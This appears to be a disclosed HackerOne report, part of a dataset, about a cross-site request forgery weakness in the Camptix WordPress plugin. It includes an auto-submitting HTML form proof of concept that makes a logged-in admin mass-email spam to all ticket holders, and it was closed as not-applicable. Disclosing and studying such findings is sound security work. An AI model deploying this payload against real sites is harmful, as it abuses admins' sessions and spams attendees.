---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159925'
original_report_id: '159925'
title: Send emails to all users using Camptix
weakness: Cross-Site Request Forgery (CSRF)
team_handle: iandunn-projects
created_at: '2016-08-17T03:57:01.296Z'
disclosed_at: '2016-09-27T21:45:12.247Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 3
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Send emails to all users using Camptix

## Metadata

- HackerOne Report ID: 159925
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: iandunn-projects
- Disclosed At: 2016-09-27T21:45:12.247Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Ian,
This is my first stab at submitting a bug, and I'm not even sure it is one. Here's what I found.

If an admin of a site using Camptix who is logged into the admin screen visits a malicious site which has access to a valid wpnonce value could send a large volume of spam to all ticket holders.

POC: 
<body onload="document.getElementById('s').submit();">
<form method=post id=s action="http://xxx/wp-admin/edit.php?post_type=tix_ticket&page=camptix_tools&tix_summarize=1&tix_section=notify&tix_notify_attendees=1">
	<input type=hidden name="tix-notify-segment-query" value='[{"field":"ticket","op":"is not","value":"1"}]'>
	<input type=hidden name="tix-notify-segment-match" value="OR">
<input type=hidden name="tix_notify_subject" value="camptix likes viagara">
<input type=hidden name="tix_notify_body" value="send scary messages about viagra">
<input type=hidden name="tix_notify_attendees" value="1">
<input type=hidden name="tix_notify_submit " value="Send E-mails">
<input type=hidden name="_wpnonce" value="122536321b">
<input type=hidden name="_wp_http_referer" value="/wp-admin/edit.php?post_type=tix_ticket&page=camptix_tools&tix_summarize=1&tix_section=notify&tix_notify_attendees=1">
	<input type=submit >	
</form>
</body>

I'm not an expert at wpnonce values, but the documentation of Wordpress indicates that you shouldn't rely on it for security, and this article claims they can be generated easily.
https://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/

The POC only sends only email to each recipient, but you could adapt it to attempt to send more. Depending on how many attendees, the script could send zero or thousands of emails.

I'm eager to hear back, and I'm eager to hear how I could make this report more helpful. :)
Jason

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
